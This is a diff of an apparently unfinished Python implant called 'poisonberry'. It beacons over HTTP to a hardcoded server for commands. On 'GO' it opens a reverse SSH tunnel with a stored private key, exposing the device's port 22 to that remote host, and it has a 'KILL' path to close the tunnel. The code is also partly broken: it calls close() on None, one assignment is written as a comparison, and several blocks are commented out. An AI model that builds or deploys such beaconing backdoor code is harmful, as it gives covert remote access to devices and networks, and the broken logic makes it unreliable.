@@ -20,8 +20,8 @@ class poisonberry:
         self.server = "192.168.1.104"
         self.data= {}
         self.command={}
-        self.run={}
-        self.port=22
+        self.running = 0
+        self.port = 22
 
     def art(self):
         print("""\                            
@@ -49,16 +49,28 @@ class poisonberry:
     def start(self):
        # self.art()
         while True: # run forever
-            while self.beacon == True:  # while we need a beacon
                 self.GET()              # http beacon
                 log(INFO,"pausing before next beacon")
                 time.sleep(5)           # sleep between beacons
-            self.tryPort()              # validate port is free, enable beacon if it is
-            log(INFO,"pausing before checking ports")
-            time.sleep(5)               # sleep between socket checks
 
+    def close_tunnel(self):
+        host="0.0.0.0"
+        port = self.port
 
-    def tryPort(self):
+        s = None
+        for res in socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
+            af, socktype, proto, canonname, sa = res
+
+            s.close()
+
+        '''
+        #old socket stuff, keep for reference for now but dump if useless
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        result = False
+
+        try:
+
+        #todo add something that frees the port when the server exits the tunnel --> would it need to be a beacon?
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         result = False
         try:
@@ -68,10 +80,9 @@ class poisonberry:
             result = True
         except:
             print("Port is in use")
-            self.beacon = False
         sock.close()
         return result
-
+        '''
 
     def GET(self):
          self.handle_request()
@@ -87,7 +98,7 @@ class poisonberry:
     def handle_request(self):
         try:
                 log(INFO,"trying to GET from %s"%(self.endpoint))
-                self.endpoint = "http://"+self.server+":8000/site2.html"
+                self.endpoint = "http://"+self.server+":8000/site.html"
                 self.data = urllib.request.urlopen(self.endpoint)
 
                 self.parse_response()
@@ -110,18 +121,27 @@ class poisonberry:
 
     def process_command(self):
         print(self.command)
-        if self.command != "GO":
-            log(INFO,"no command given")
+        if self.command == "GO" and self.running==0:
+
+            log(INFO,"Creating tunnel")
+            cmd = 'sudo /usr/bin/ssh -i /etc/berry_key -fN -R 7888:localhost:' + str(self.port) + " " + self.home + "@" + self.server  # TODO not any of this see blackhat sshtunnel with python script
+            print(cmd)
+            os.system(cmd)
+            log(DEBUG, "running")
+            self.running = 1
+
+        elif self.command == "KILL" and self.running==1:
+            log(INFO,"Closing Tunnel")
+            self.close_tunnel()
+            self.running == 0
+
+
+
+
+
+
         else:
-            if self.tryPort() == True:
-
-                cmd = 'sudo /usr/bin/ssh -i /etc/berry_key -fN -R 7888:localhost:'+str(self.port) + " " + self.home+"@"+self.server# TODO replace with ssh tunnel
-                print(cmd)
-                os.system(cmd)
-                log(DEBUG,"running")
-
-            else:
-                log(DEBUG,"port not free, do nothing")
+            log(DEBUG,"no new command")
 
             #old idea of if run once ignore subsequent commands, untested so idk if we need this still
             '''
@@ -133,6 +153,11 @@ class poisonberry:
                 log(DEBUG,"running")
                 print("running")
             '''
+
+    def ssh_tunnel(self):
+        log(INFO, "write this part")
+
+
 c=poisonberry()
 
 c.start()
